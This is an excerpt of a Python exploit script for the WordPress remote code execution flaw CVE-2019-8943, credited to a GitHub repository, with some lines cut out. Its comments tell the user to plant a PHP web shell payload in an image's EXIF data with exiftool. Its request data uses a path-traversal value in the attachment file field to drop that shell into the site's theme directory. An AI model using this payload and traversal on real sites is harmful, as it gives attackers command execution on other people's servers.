#original : https://github.com/v0lck3r/CVE-2019-8943/blob/main/RCE_wordpress.py
import requests
import re
import sys
...
# 1- image name as : "test.jpg"
# 2- place the image in the same directory as this exploit.
# 3- inject the php payload via exiftool : exiftool test.jpg -CopyrightNotice="<?=\`\$_GET[0]\`?>"
...
data = {
	...
	'action':'editpost',
	'post_ID':image_id,
	'meta_input[_wp_attached_file]':date+imagename+'?/../../../../themes/'+wp_theme+'/shell'
#  	'meta_input[_wp_attached_file]':date+imagename+'?/../test'
}
